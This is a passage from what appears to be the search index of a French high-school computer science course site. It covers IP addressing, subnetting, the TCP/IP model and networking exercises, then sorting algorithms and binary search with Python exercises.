partagent un m\u00eame c\u00e2ble de communication principal.              \ud83c\udf33 Hi\u00e9rarchique                  Structure arborescente avec plusieurs niveaux de connexions, du plus g\u00e9n\u00e9ral au plus sp\u00e9cifique.              \ud83e\udd1d P2P (Pair-\u00e0-Pair)                  Chaque machine peut communiquer directement avec toutes les autres sans point central.              \ud83d\udd0d Adresses MAC et IP \ud83d\udcd6 Syst\u00e8mes d'Adressage              Pour identifier et localiser les machines sur un r\u00e9seau, deux types d'adresses sont utilis\u00e9s : les adresses MAC (physiques) et les adresses IP (logiques).          \ud83d\udcb3 Adresse MAC Media Access Control - Adresse physique d'une interface de carte r\u00e9seau, unique et propre \u00e0 la carte. Format : 6 groupes de 16 bits en hexad\u00e9cimal Exemple : a8:9f:d9:4c:5c:d9 Le switch utilise l'adresse MAC pour retransmettre les donn\u00e9es \u00e0 la bonne machine. \ud83c\udf10 Adresse IP                  Adresse logique d'une machine sur un r\u00e9seau, attribu\u00e9e \u00e0 la premi\u00e8re connexion. Format : 4 octets en d\u00e9cimal Exemple humain : 123.32.41.74 Exemple machine : 01111011.00100000.00101001.01001010 Permet 2\u00b3\u00b2 = 4 294 967 296 adresses diff\u00e9rentes. \ud83d\udd27 Composition d'une Adresse IP              Une adresse IP est compos\u00e9e de deux parties :             <ul> <li>L'adresse du r\u00e9seau : Partie commune \u00e0 toutes les machines du r\u00e9seau</li> <li>L'adresse de la machine : Partie sp\u00e9cifique \u00e0 chaque machine du r\u00e9seau</li> </ul>             Ces deux parties sont distingu\u00e9es par le nombre de bits qui leurs sont associ\u00e9s.          \ud83c\udfad Masque de Sous-r\u00e9seau              On d\u00e9finit un masque comme \u00e9tant le nombre de bits n\u00e9cessaires pour repr\u00e9senter l'adresse du r\u00e9seau.             Pour retrouver l'adresse du r\u00e9seau, on r\u00e9alise une op\u00e9ration logique ET sur chacun des bits.             Ce masque est repr\u00e9sent\u00e9 \u00e0 la fin de l'adresse IP pr\u00e9c\u00e9d\u00e9e d'un / (slash), appel\u00e9 notation CIDR.          \ud83d\udca1 Exemple de Calcul d'Adresse R\u00e9seau         Adresse : 123.32.41.74/16 (16 bits pour l'adresse r\u00e9seau)         Masque : 11111111.11111111.00000000.00000000         Adresse : 01111011.00100000.00101001.01001010         ET logique :         11111111.11111111.00000000.00000000         01111011.00100000.00101001.01001010         \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500         01111011.00100000.00000000.00000000         R\u00e9sultat : 123.32.0.0 (adresse du r\u00e9seau)               \u26a0\ufe0f Adresses R\u00e9serv\u00e9es         \u2022 L'adresse du r\u00e9seau (inutilisable pour les machines)         \u2022 L'adresse de broadcast (se termine par 255, pour diffusion g\u00e9n\u00e9rale)               \ud83d\udca1 Calcul du nombre de machines         Nombre d'adresses disponibles = 2^(nombre de bits partie machine) - 2         Exemple : 16 bits machine \u2192 2^16 - 2 = 65 534 machines possibles      \ud83d\udcca Classes d'Adresses IP \ud83d\udcda Classification Historique              Historiquement, les adresses IP \u00e9taient regroup\u00e9es en classes pour leur attribution \u00e0 divers organismes.          \ud83c\udd70\ufe0f Classe A Plage : 1.0.0.0 - 126.0.0.0 R\u00e9seaux : 128 H\u00f4tes/r\u00e9seau : 16 777 214 Usage : R\u00e9seaux tr\u00e8s grands (gouvernements, grandes entreprises)              \ud83c\udd71\ufe0f Classe B Plage : 128.0.0.0 - 191.255.0.0 R\u00e9seaux : 16 384 H\u00f4tes/r\u00e9seau : 65 534 Usage : R\u00e9seaux moyens (universit\u00e9s, entreprises moyennes)              \ud83c\udd72 Classe C Plage : 192.0.0.0 - 223.255.255.0 R\u00e9seaux : 2 097 152 H\u00f4tes/r\u00e9seau : 254 Usage : Petits r\u00e9seaux (petites entreprises)              \ud83d\udce1 Classe D Plage : 224.0.0.0 - 239.255.255.255 Usage : Multicast (transmission vers plusieurs destinataires simultan\u00e9ment)              \ud83d\udd2c Classe E Plage : 240.0.0.0 - 255.255.255.255 Usage : R\u00e9serv\u00e9 pour utilisations futures et exp\u00e9rimentales              \ud83c\udf10 IPv6 - \u00c9volution du Protocole \ud83d\ude80 N\u00e9cessit\u00e9 d'IPv6              Le protocole IPv4 permet de d\u00e9finir 2\u00b3\u00b2 adresses (\u2248 4 milliards). Avec l'explosion du nombre d'appareils connect\u00e9s, ce nombre devient insuffisant.          \ud83d\udcca IPv4 vs IPv6 IPv4 : 32 bits \u2192 2\u00b3\u00b2 \u2248 4 milliards d'adresses IPv6 : 128 bits \u2192 2\u00b9\u00b2\u2078 \u2248 3,4 \u00d7 10\u00b3\u2078 adresses Format IPv6 : 8 groupes de 4 chiffres hexad\u00e9cimaux Exemple : 2001:0db8:85a3:0000:0000:8a2e:0370:7334              \ud83c\udfe0 Adresses Priv\u00e9es \ud83d\udd12 R\u00e9seaux Locaux              Certaines plages d'adresses IP sont r\u00e9serv\u00e9es pour un usage priv\u00e9 (r\u00e9seaux locaux) et ne sont pas rout\u00e9es sur Internet.          \ud83c\udd70\ufe0f Classe A Priv\u00e9e Plage : 10.0.0.0 \u00e0 10.255.255.255 Masque : 255.0.0.0 (/8) Usage : Grands r\u00e9seaux priv\u00e9s              \ud83c\udd71\ufe0f Classe B Priv\u00e9e Plage : 172.16.0.0 \u00e0 172.31.255.255 Masque : 255.240.0.0 (/12) Usage : R\u00e9seaux priv\u00e9s moyens              \ud83c\udd72 Classe C Priv\u00e9e Plage : 192.168.0.0 \u00e0 192.168.255.255 Masque : 255.255.0.0 (/16) Usage : Petits r\u00e9seaux domestiques/entreprise                       \ud83d\udca1 Avantage des Adresses Priv\u00e9es         Permettent aux r\u00e9seaux locaux d'utiliser des adresses IP sans risquer de conflit avec les adresses publiques d'Internet.      \ud83c\udfd7\ufe0f Mod\u00e8le TCP/IP \ud83d\udce1 Protocole de Communication              Le mod\u00e8le TCP/IP est un mod\u00e8le en couche qui permet d'illustrer l'encapsulation des donn\u00e9es pour permettre leur envoi, leur r\u00e9ception et leur traitement.          \ud83d\udce6 Processus d'Encapsulation              L'encapsulation est un concept cl\u00e9 du mod\u00e8le TCP/IP :             <ol> <li>Les donn\u00e9es sont g\u00e9n\u00e9r\u00e9es au niveau de la couche Application</li> <li>Chaque couche inf\u00e9rieure ajoute ses propres informations (en-t\u00eates)</li> <li>\u00c0 la r\u00e9ception, chaque couche retire ses informations</li> <li>Les donn\u00e9es sont reconstitu\u00e9es dans leur \u00e9tat original</li> </ol>          \ud83d\udca1 Analogie Postale         On peut comparer le mod\u00e8le TCP/IP \u00e0 un syst\u00e8me postal :         \u2022 Couche Application = R\u00e9daction de la lettre         \u2022 Couche Transport = Mise sous enveloppe, num\u00e9rotation         \u2022 Couche Internet = Adressage, choix de l'acheminement         \u2022 Couche Acc\u00e8s R\u00e9seau = Distribution physique      \ud83d\udd27 Structure des Couches 1 Couche Acc\u00e8s R\u00e9seau                  G\u00e8re la transmission physique des donn\u00e9es sur le r\u00e9seau local. Combine les fonctions des couches physique et liaison de donn\u00e9es du mod\u00e8le OSI.                  Fonctions :                 \u2022 Transmission des bits sur le support physique                 \u2022 D\u00e9tection et correction d'erreurs                 \u2022 Contr\u00f4le d'acc\u00e8s au support                 \u2022 Adressage physique (MAC) Protocoles : Ethernet, Wi-Fi, Bluetooth              2 Couche Internet                  Responsable du routage des paquets \u00e0 travers diff\u00e9rents r\u00e9seaux pour atteindre leur destination.                  Fonctions :                 \u2022 Adressage logique (IP)                 \u2022 Routage des paquets                 \u2022 Fragmentation et r\u00e9assemblage                 \u2022 Contr\u00f4le de congestion Protocoles : IP (IPv4/IPv6), ICMP, ARP              3 Couche Transport                  Assure la transmission fiable des donn\u00e9es entre les applications.                  Fonctions :                 \u2022 Segmentation et r\u00e9assemblage des donn\u00e9es                 \u2022 Contr\u00f4le de flux                 \u2022 D\u00e9tection et correction d'erreurs                 \u2022 Multiplexage des connexions Protocoles :                 \u2022 TCP : Fiable, avec contr\u00f4le d'erreurs                 \u2022 UDP : Rapide, sans garantie de livraison              4 Couche Application                  Fournit les services r\u00e9seau directement aux applications utilisateur.                  Fonctions :                 \u2022 Interface avec les applications                 \u2022 Services de haut niveau                 \u2022 Formatage et pr\u00e9sentation des donn\u00e9es Protocoles : HTTP/HTTPS, FTP, SMTP, DNS, SSH              \u2699\ufe0f Fonctionnement              Chaque couche a sa t\u00e2che pr\u00e9d\u00e9finie, notamment gr\u00e2ce aux protocoles qui sont en jeu."},{"location":"premiere/VI-Internet_et_Reseaux/Fiche_exercices_internet_reseaux/","title":"Fiche d'exercices : Internet et R\u00e9seaux","text":""},{"location":"premiere/VI-Internet_et_Reseaux/Fiche_exercices_internet_reseaux/#partie-1-modele-en-couches-et-protocoles","title":"\ud83d\udcda Partie 1 : Mod\u00e8le en couches et protocoles","text":"Introduction \ud83e\udd8a Exercice 1 - Le mod\u00e8le OSI Le mod\u00e8le OSI comprend 7 couches. Associez chaque couche \u00e0 sa fonction : Couches : Physique, Liaison, R\u00e9seau, Transport, Session, Pr\u00e9sentation, Application Fonctions :             1. Transmission des bits sur le support physique             2. Routage des paquets entre r\u00e9seaux             3. Interface avec l'utilisateur             4. Contr\u00f4le de flux et correction d'erreurs             5. \u00c9tablissement et gestion des connexions             6. Chiffrement et compression des donn\u00e9es             7. Transport fiable des donn\u00e9es          \u2192 Voir la correction          Associations correctes :                 \u2022 Physique \u2192 1. Transmission des bits sur le support physique                 \u2022 Liaison \u2192 4. Contr\u00f4le de flux et correction d'erreurs                 \u2022 R\u00e9seau \u2192 2. Routage des paquets entre r\u00e9seaux                 \u2022 Transport \u2192 7. Transport fiable des donn\u00e9es                 \u2022 Session \u2192 5. \u00c9tablissement et gestion des connexions                 \u2022 Pr\u00e9sentation \u2192 6. Chiffrement et compression des donn\u00e9es                 \u2022 Application \u2192 3. Interface avec l'utilisateur              Introduction \ud83e\udd8a Exercice 2 - Adresses IP R\u00e9pondez aux questions suivantes sur les adresses IP :             1. Combien d'octets compose une adresse IPv4 ?             2. Quelle est la plage de valeurs possibles pour chaque octet ?             3. Donnez un exemple d'adresse IP priv\u00e9e             4. Quelle est la diff\u00e9rence entre une adresse IP publique et priv\u00e9e ?          \u2192 Voir la correction          R\u00e9ponses :                 1. Une adresse IPv4 est compos\u00e9e de 4 octets                 2. Chaque octet peut avoir une valeur de 0 \u00e0 255                 3. Exemples d'adresses priv\u00e9es : 192.168.1.1, 10.0.0.1, 172.16.0.1                 4. Les adresses publiques sont uniques sur Internet, les priv\u00e9es sont utilis\u00e9es dans les r\u00e9seaux locaux              Moyen \ud83e\udd8a\ud83e\udd8a Exercice 3 - Protocoles r\u00e9seau Pour chaque situation, indiquez le protocole utilis\u00e9 :             1. Envoi d'un email             2. Navigation sur un site web s\u00e9curis\u00e9             3. Transfert de fichiers             4. R\u00e9solution de nom de domaine             5. Attribution automatique d'adresse IP             6. Test de connectivit\u00e9 r\u00e9seau          \u2192 Voir la correction          Protocoles :                 1. SMTP (Simple Mail Transfer Protocol)                 2. HTTPS (HTTP Secure)                 3. FTP (File Transfer Protocol)                 4. DNS (Domain Name System)                 5. DHCP (Dynamic Host Configuration Protocol)                 6. PING (utilise ICMP)              Moyen \ud83e\udd8a\ud83e\udd8a Exercice 4 - Calcul de sous-r\u00e9seaux Soit le r\u00e9seau 192.168.1.0/24 :             1. Combien d'adresses IP sont disponibles ?             2. Quelle est l'adresse de diffusion (broadcast) ?             3. Quelles sont les adresses utilisables pour les h\u00f4tes ?             4. Si on divise ce r\u00e9seau en 4 sous-r\u00e9seaux \u00e9gaux, donnez les plages d'adresses          \u2192 Voir la correction          R\u00e9ponses :                 1. 256 adresses (de 192.168.1.0 \u00e0 192.168.1.255)                 2. Adresse de diffusion : 192.168.1.255                 3. Adresses utilisables : 192.168.1.1 \u00e0 192.168.1.254 (254 adresses)                 4. Sous-r\u00e9seaux (/26) :                    \u2022 192.168.1.0/26 : 192.168.1.1-62                    \u2022 192.168.1.64/26 : 192.168.1.65-126                    \u2022 192.168.1.128/26 : 192.168.1.129-190                    \u2022 192.168.1.192/26 : 192.168.1.193-254              Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Exercice 5 - Routage et tables de routage Analysez cette table de routage et r\u00e9pondez aux questions : <pre>\nDestination     Masque          Passerelle      Interface\n0.0.0.0         0.0.0.0         192.168.1.1     eth0\n192.168.1.0     255.255.255.0   0.0.0.0         eth0\n10.0.0.0        255.0.0.0       192.168.1.254   eth0\n            </pre>             1. Que signifie la premi\u00e8re ligne ?             2. Vers o\u00f9 sera rout\u00e9 un paquet destin\u00e9 \u00e0 192.168.1.50 ?             3. Vers o\u00f9 sera rout\u00e9 un paquet destin\u00e9 \u00e0 10.5.3.2 ?             4. Vers o\u00f9 sera rout\u00e9 un paquet destin\u00e9 \u00e0 8.8.8.8 ?          \u2192 Voir la correction          Analyse :                 1. La premi\u00e8re ligne est la route par d\u00e9faut (0.0.0.0/0) vers la passerelle 192.168.1.1                 2. 192.168.1.50 correspond au r\u00e9seau local (192.168.1.0/24), envoi direct via eth0                 3. 10.5.3.2 correspond au r\u00e9seau 10.0.0.0/8, rout\u00e9 vers 192.168.1.254                 4. 8.8.8.8 ne correspond \u00e0 aucune route sp\u00e9cifique, utilise la route par d\u00e9faut vers 192.168.1.1              Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Exercice 6 - Analyse de trame Ethernet Analysez cette trame Ethernet (en hexad\u00e9cimal) : <pre>FF FF FF FF FF FF 00 1A 2B 3C 4D 5E 08 00 45 00 00 1C ...</pre>             1. Quelle est l'adresse MAC de destination ?             2. Quelle est l'adresse MAC source ?             3. Quel est le type de protocole encapsul\u00e9 ?             4. S'agit-il d'une diffusion (broadcast) ?          \u2192 Voir la correction          Analyse de la trame :                 1. Adresse MAC destination : FF:FF:FF:FF:FF:FF                 2. Adresse MAC source : 00:1A:2B:3C:4D:5E                 3. Type de protocole : 0x0800 = IPv4                 4. Oui, c'est une diffusion car l'adresse de destination est FF:FF:FF:FF:FF:FF"},{"location":"premiere/VI-Internet_et_Reseaux/Fiche_exercices_internet_reseaux/#partie-2-securite-et-chiffrement","title":"\ud83d\udcda Partie 2 : S\u00e9curit\u00e9 et chiffrement","text":"Introduction \ud83e\udd8a Exercice 7 - Types de chiffrement Classez ces m\u00e9thodes de chiffrement :             AES, RSA, C\u00e9sar, DES, Diffie-Hellman, Vigen\u00e8re Cat\u00e9gories :             \u2022 Chiffrement sym\u00e9trique             \u2022 Chiffrement asym\u00e9trique             \u2022 Chiffrement historique          \u2192 Voir la correction          Classification :                 \u2022 Sym\u00e9trique : AES, DES                 \u2022 Asym\u00e9trique : RSA, Diffie-Hellman                 \u2022 Historique : C\u00e9sar, Vigen\u00e8re              Moyen \ud83e\udd8a\ud83e\udd8a Exercice 8 - Certificats et PKI Expliquez le r\u00f4le de chaque \u00e9l\u00e9ment dans une PKI :             1. Autorit\u00e9 de certification (CA)             2. Certificat num\u00e9rique             3. Cl\u00e9 publique             4. Cl\u00e9 priv\u00e9e             5. R\u00e9vocation de certificat          \u2192 Voir la correction          R\u00f4les :                 1. CA : Entit\u00e9 de confiance qui \u00e9met et signe les certificats                 2. Certificat : Document \u00e9lectronique qui lie une identit\u00e9 \u00e0 une cl\u00e9 publique                 3. Cl\u00e9 publique : Cl\u00e9 partag\u00e9e publiquement pour chiffrer ou v\u00e9rifier des signatures                 4. Cl\u00e9 priv\u00e9e : Cl\u00e9 secr\u00e8te pour d\u00e9chiffrer ou signer                 5. R\u00e9vocation : Processus d'invalidation d'un certificat compromis"},{"location":"premiere/VI-Internet_et_Reseaux/bit_alterne/","title":"Bit altern\u00e9","text":""},{"location":"premiere/VI-Internet_et_Reseaux/bit_alterne/#quelle-est-lutilite-du-protocole-du-bit-alterne","title":"Quelle est l'utilit\u00e9 du protocole du bit altern\u00e9 ?","text":"<p>Dans une communication, on souhaite toujours savoir si la personne qui doit recevoir un message, le re\u00e7oit r\u00e9ellement. On peut l'illustrer par exemple avec l'usage d'un talkie walkie :  A chaque message parl\u00e9 sur le talkie-walkie, l'utilisateur utilise un code sp\u00e9cial pour dire que son message est termin\u00e9, en g\u00e9n\u00e9ral \"Termin\u00e9\" L'autre correspondant, s'il a re\u00e7u le message pr\u00e9c\u00e9dent doit bien commencer le sien par \"Je re\u00e7ois\" ou \"Re\u00e7u\". Cela permettait aux diff\u00e9rents communiquants d'accuser r\u00e9ceptions de leurs messages respectifs.</p> <p></p> <p>Cela peut se transposer dans les communications num\u00e9riques, notamment l'envoi de paquets. Rappel : Avoir besoin d'un accus\u00e9 de reception est une des principes fondamentaux du protocole TCP. Voir le cours sur les protocoles de communication</p> <p> </p>"},{"location":"premiere/VI-Internet_et_Reseaux/bit_alterne/#comment-cela-sillustre-t-il","title":"Comment cela s'illustre-t-il ?","text":"<p>En informatique, on se rapproche du m\u00eame principe.  Dans chaque requ\u00eate, on dispose d'un bit, souvent repr\u00e9sent\u00e9 \u00e0 la fin de l'ent\u00eate, qui correspond \u00e0 un envoi de message.</p> <p>Dans le mod\u00e8le client-serveur, le client envoie sa premi\u00e8re requ\u00eate avec ce bit \u00e0 0. Le serveur, re\u00e7oit la requ\u00eate, analyse la valeur du bit, s'il vaut 0, il envoie sa ressource avec le bit correspondant \u00e0 1.</p> <p>On distingue deux cas :</p> <ul> <li>Si le client re\u00e7oit la ressource, il s'aper\u00e7oit que le bit est \u00e0 1, donc que sa requ\u00eate \u00e0 bien \u00e9t\u00e9 trait\u00e9e par le serveur. Il envoie donc une autre requ\u00eate avec cette fois-ci ce bit de contr\u00f4le \u00e0 1 pour indiquer au serveur qu'il a re\u00e7u sa r\u00e9ponse.</li> <li>L'envoie de paquet est chronom\u00e9tr\u00e9. Si le serveur n'a accus\u00e9 de la reception de la ressource par le client, il se passe une TIMEOUT. Le serveur comprend que la ressource n'est pas arriv\u00e9e et donc la renvoie avec le m\u00eame bit de contr\u00f4le.</li> </ul> <p>Si le client re\u00e7oit enfin sa ressource, il r\u00e9alise une nouvelle requ\u00eate avec le bit de contr\u00f4le re\u00e7u.  Le serveur lui envoie la ressource suivante avec cette fois-ci le bit de contr\u00f4le inverse, indiquant qu'il a bien connaissance que le client a re\u00e7u la ressource pr\u00e9c\u00e9dente.</p>"},{"location":"premiere/VII-Algorithmes_sur_les_tableaux/Cours/","title":"Cours","text":"\ud83d\udcda Algorithmes sur les Tableaux Optimisation du Tri : Algorithmes de Comparaison \ud83c\udfaf D\u00e9finitions et Probl\u00e9matiques \ud83d\udcd6 Qu'est-ce que trier ?              Trier consiste \u00e0 organiser un ensemble d'\u00e9l\u00e9ments dans un ordre pr\u00e9cis (g\u00e9n\u00e9ralement croissant ou d\u00e9croissant).             C'est une op\u00e9ration fondamentale en informatique, utilis\u00e9e dans de nombreux domaines.          \ud83d\udcca Classement de Donn\u00e9es                  Organisation et structuration des informations pour faciliter leur consultation et leur analyse.              \u2699\ufe0f Pr\u00e9paration Algorithmique                  Pr\u00e9paration de donn\u00e9es pour d'autres algorithmes qui n\u00e9cessitent des donn\u00e9es ordonn\u00e9es.              \ud83d\ude80 Optimisation des Performances                  Am\u00e9lioration significative des performances de recherche et d'acc\u00e8s aux donn\u00e9es.              \ud83d\udd27 Strat\u00e9gies de Tri              On peut trier des donn\u00e9es de plusieurs mani\u00e8res :             <ul> <li>Par comparaison : on compare les \u00e9l\u00e9ments entre eux</li> <li>Sans comparaison : on utilise des propri\u00e9t\u00e9s sp\u00e9cifiques des donn\u00e9es</li> </ul> \ud83d\udd0d Tri par S\u00e9lection \ud83d\udcd6 Principe de Fonctionnement              Au d\u00e9but de l'algorithme, on cherche la plus petite valeur de la liste et on l'\u00e9change avec la valeur situ\u00e9e \u00e0 la premi\u00e8re position.             \u00c0 partir de cette it\u00e9ration, on consid\u00e8re que la liste \u00e0 trier est compos\u00e9e d'une partie tri\u00e9e et d'une partie non tri\u00e9e.          1. Chercher la valeur la plus petite de la zone non tri\u00e9e 2. Placer cette valeur au d\u00e9but de la zone non tri\u00e9e 3. \u00c9tendre la zone tri\u00e9e d'un \u00e9l\u00e9ment 4. R\u00e9p\u00e9ter jusqu'\u00e0 ce que toute la liste soit tri\u00e9e \ud83d\udca1 Exemple Illustratif              Liste initiale : [5, 2, 4, 6, 1, 3]          \u00c9tapes Liste en cours Min s\u00e9lectionn\u00e9 D\u00e9but [5, 2, 4, 6, 1, 3] 1 \u00c9tape 1 [1, 2, 4, 6, 5, 3] 2 \u00c9tape 2 [1, 2, 3, 6, 5, 4] 3 ... ... ... Final [1, 2, 3, 4, 5, 6] - \ud83d\udc0d Impl\u00e9mentation en Python              On va avoir besoin de trois fonctions :             <ul> <li><code>indice_minimum_tranche</code> : trouve l'indice du minimum dans une portion de la liste</li> <li><code>echange_valeur</code> : \u00e9change deux valeurs dans la liste</li> <li><code>tri_selection</code> : r\u00e9alise le tri complet</li> </ul> \ud83e\udd8a Exercice Important : Indice de la valeur minimum dans une tranche \u00c9crire une fonction <code>indice_minimum_tranche</code> qui prend en param\u00e8tres une liste, un indice de d\u00e9but et qui renvoie l'indice de la valeur la plus petite dans la tranche donn\u00e9e. Attention, cette fonction doit bien v\u00e9rifier que les indices soient bien compris dans la liste pour \u00e9viter les erreurs de Out Of Range. \ud83d\udca1 Exemple <pre><code>&gt;&gt;&gt; liste = [1,5,2,4,0,8]\n&gt;&gt;&gt; indice_minimum_tranche(liste,1)\n4</code></pre> \ud83e\udd8a Exercice Important : \u00c9change de valeur \u00e0 l'aide des indices \u00c9crire une fonction <code>echange_valeur</code> qui prend en param\u00e8tre une liste et deux indices et \u00e9change les positions des deux valeurs dans la liste Attention, cette fonction fait une modification par effet de bord et ne renvoie rien. \ud83d\udca1 Exemple <pre><code>&gt;&gt;&gt; liste = [1,5,2,4,0,8]\n&gt;&gt;&gt; echange_valeur(liste, 0, 4)\n&gt;&gt;&gt; print(liste)\n[0,5,2,4,1,8]</code></pre> \ud83e\udd8a Exercice Important : Tri par s\u00e9lection du minimum \u00c9crire une fonction <code>tri_selection_minimum</code> qui prend en param\u00e8tre une liste et renvoie sa permutation tri\u00e9e. Attention, on ne doit pas modifier la liste pass\u00e9e en param\u00e8tre car cela pourrait la changer dans toute la suite du programme et il peut y avoir des cas d'usage o\u00f9 cette liste ne doit pas \u00eatre modifi\u00e9e. \ud83d\udca1 Exemple <pre><code>&gt;&gt;&gt; liste = [1,5,2,4,0,8]\n&gt;&gt;&gt; print(tri_selection_minimum(liste))\n[0,1,2,4,5,8]</code></pre> \ud83d\udd04 Tri par Insertion \ud83d\udcd6 Principe de Fonctionnement              On consid\u00e8re que la liste \u00e0 trier est compos\u00e9e d'une partie tri\u00e9e compos\u00e9e d'un \u00e9l\u00e9ment et une partie non tri\u00e9e.             \u00c0 chaque it\u00e9ration <code>i</code> du tri, on va chercher \u00e0 d\u00e9placer la valeur que l'on retrouve \u00e0 la position <code>i</code> \u00e0 sa bonne position dans la zone tri\u00e9e.          1. Consid\u00e9rer le premier \u00e9l\u00e9ment comme d\u00e9j\u00e0 tri\u00e9 2. Prendre l'\u00e9l\u00e9ment suivant de la zone non tri\u00e9e 3. L'ins\u00e9rer \u00e0 sa place dans la zone tri\u00e9e 4. R\u00e9p\u00e9ter jusqu'\u00e0 ce que toute la liste soit tri\u00e9e \ud83d\udca1 Exemple Illustratif              Liste initiale : [5, 2, 4, 6, 1, 3]          \u00c9tapes Liste en cours \u00c9l\u00e9ment ins\u00e9r\u00e9 D\u00e9but [5, 2, 4, 6, 1, 3] - \u00c9tape 1 [2, 5, 4, 6, 1, 3] 2 \u00c9tape 2 [2, 4, 5, 6, 1, 3] 4 \u00c9tape 3 [2, 4, 5, 6, 1, 3] 6 \u00c9tape 4 [1, 2, 4, 5, 6, 3] 1 \u00c9tape 5 [1, 2, 3, 4, 5, 6] 3 Final [1, 2, 3, 4, 5, 6] - \ud83d\udc0d Impl\u00e9mentation en Python              On va avoir besoin de trois fonctions :             <ul> <li><code>echange_valeur</code> : \u00e9change deux valeurs dans la liste</li> <li><code>insertion_zone_triee</code> : ins\u00e8re un \u00e9l\u00e9ment \u00e0 sa place dans la zone tri\u00e9e</li> <li><code>tri_insertion</code> : r\u00e9alise le tri complet</li> </ul> \ud83e\udd8a Exercice Important : \u00c9change de valeur \u00e0 l'aide des indices \u00c9crire une fonction <code>echange_valeur</code> qui prend en param\u00e8tre une liste et deux indices et \u00e9change les positions des deux valeurs dans la liste Attention, cette fonction fait une modification par effet de bord et ne renvoie rien. \ud83d\udca1 Exemple <pre><code>&gt;&gt;&gt; liste = [1,5,2,4,0,8]\n&gt;&gt;&gt; echange_valeur(liste, 0, 4)\n&gt;&gt;&gt; print(liste)\n[0,5,2,4,1,8]</code></pre> \ud83e\udd8a Exercice Important : Insertion d'une valeur dans une zone tri\u00e9e \u00c9crire une fonction <code>insertion_zone_triee</code> qui prend en param\u00e8tre une liste, et un indice correspondant \u00e0 celui de la valeur qui est juste apr\u00e8s la zone tri\u00e9e. Cette fonction \u00e9change la valeur \u00e0 l'indice avec celles qui sont avant elles pour trouver sa bonne place. Attention, cette fonction doit bien v\u00e9rifier que les indices soient bien compris dans la liste pour \u00e9viter les erreurs de Out Of Range. \ud83d\udca1 Exemple <pre><code>&gt;&gt;&gt; liste = [1,5,2,4,0,8]\n&gt;&gt;&gt; insertion_zone_triee(liste,2)\n&gt;&gt;&gt; print(liste)\n[1,2,5,4,0,8]</code></pre> \ud83e\udd8a Exercice Important : Tri par insertion \u00c9crire une fonction <code>tri_insertion</code> qui prend en param\u00e8tre une liste et renvoie sa permutation tri\u00e9e. Attention, on ne doit pas modifier la liste pass\u00e9e en param\u00e8tre car cela pourrait la changer dans toute la suite du programme et il peut y avoir des cas d'usage o\u00f9 cette liste ne doit pas \u00eatre modifi\u00e9e. \ud83d\udca1 Exemple <pre><code>&gt;&gt;&gt; liste = [1,5,2,4,0,8]\n&gt;&gt;&gt; print(tri_insertion(liste))\n[0,1,2,4,5,8]</code></pre> \ud83d\udd22 Tris Sans Comparaison \ud83d\udcd6 D\u00e9finition              Les tris sans comparaison sont des algorithmes qui n'utilisent pas de comparaisons entre \u00e9l\u00e9ments mais exploitent des propri\u00e9t\u00e9s sp\u00e9cifiques des donn\u00e9es pour les organiser.          \ud83e\uddee Tri par D\u00e9nombrement              Le tri par d\u00e9nombrement est un algorithme de tri qui n'agit pas par comparaisons mais par comptage des \u00e9l\u00e9ments de la liste. Exemple : Dans la liste L <code>[3,2,1,2]</code>, on peut d\u00e9nombrer les valeurs de cette mani\u00e8re : une occurence de 1, deux occurences de 2 et une occurence de 3.          1. Cr\u00e9er une liste d'occurrences de taille max+1 2. Compter les occurrences de chaque \u00e9l\u00e9ment 3. Reconstruire la liste tri\u00e9e \u00e0 partir des compteurs \u2699\ufe0f Principe de fonctionnement              On consid\u00e8re la liste L pr\u00e9c\u00e9dente :             <ul> <li>On cr\u00e9e une liste d'occurrences contenant un nombre de 0 \u00e9quivalent \u00e0 la valeur maximale + 1 de la liste \u00e0 trier</li> <li>On parcourt la liste L \u00e0 trier et \u00e0 chaque \u00e9l\u00e9ment, on incr\u00e9mente la valeur \u00e0 l'indice du nombre rencontr\u00e9</li> <li>On reconstruit la liste tri\u00e9e en parcourant la liste d'occurrences</li> </ul> Phase 1 : Comptage des occurrences It\u00e9ration L Occurrences 0 [3,2,1,2] [0, 0, 0, 0] 1 [3, 2, 1, 2] [0, 0, 0, 1] 2 [3, 2, 1, 2] [0, 0, 1, 1] 3 [3, 2, 1, 2] [0, 1, 1, 1] 4 [3, 2, 1, 2] [0, 1, 2, 1] Phase 2 : Reconstruction de la liste tri\u00e9e It\u00e9ration Occurrences Liste tri\u00e9e 1 [0, 1, 2, 1] [] 2 [0, 1, 2, 1] [1] 3 [0, 1, 2, 1] [1, 2, 2] 4 [0, 1, 2, 1] [1,2,2,3]"},{"location":"premiere/VII-Algorithmes_sur_les_tableaux/dicho/","title":"Dicho","text":"\ud83d\udd0d La Recherche Dichotomique \u2753 Qu'est-ce que la recherche dichotomique ? \ud83d\udcd6 D\u00e9finition              La dichotomie est une m\u00e9thode de recherche qui permet de trouver rapidement un \u00e9l\u00e9ment dans une liste tri\u00e9e en divisant r\u00e9cursivement l'espace de recherche par deux.             C'est comme chercher quelqu'un dans un annuaire t\u00e9l\u00e9phonique : au lieu de lire page par page, vous ouvrez au milieu et d\u00e9cidez de continuer \u00e0 gauche ou \u00e0 droite.          \u2699\ufe0f Principe Fondamental              Le principe de la recherche dichotomique repose sur trois \u00e9tapes simples :          1 Commencer au milieu de la liste 2 Comparer l'\u00e9l\u00e9ment recherch\u00e9 avec la valeur m\u00e9diane 3 \u00c9liminer la moiti\u00e9 de la liste qui ne peut pas contenir l'\u00e9l\u00e9ment          \u26a0\ufe0f Condition Pr\u00e9alable : La liste doit \u00eatre tri\u00e9e (par ordre croissant ou d\u00e9croissant)      \ud83d\udc0d Algorithme en Pseudocode <pre><code>fonction recherche_dichotomique(liste, valeur):\n    debut \u2190 0\n    fin \u2190 longueur(liste) - 1\n\n    tant que debut &lt;= fin:\n        milieu \u2190 (debut + fin) // 2\n        si liste[milieu] == valeur:\n            retourner milieu  # L'indice o\u00f9 se trouve la valeur\n        sinon si liste[milieu] &lt; valeur:\n            debut \u2190 milieu + 1\n        sinon:\n            fin \u2190 milieu - 1\n\n    retourner -1  # La valeur n'est pas dans la liste</code></pre>"},{"location":"premiere/VII-Algorithmes_sur_les_tableaux/Mesures_de_complexite/readme/","title":"Modalit\u00e9s de rendu : DM 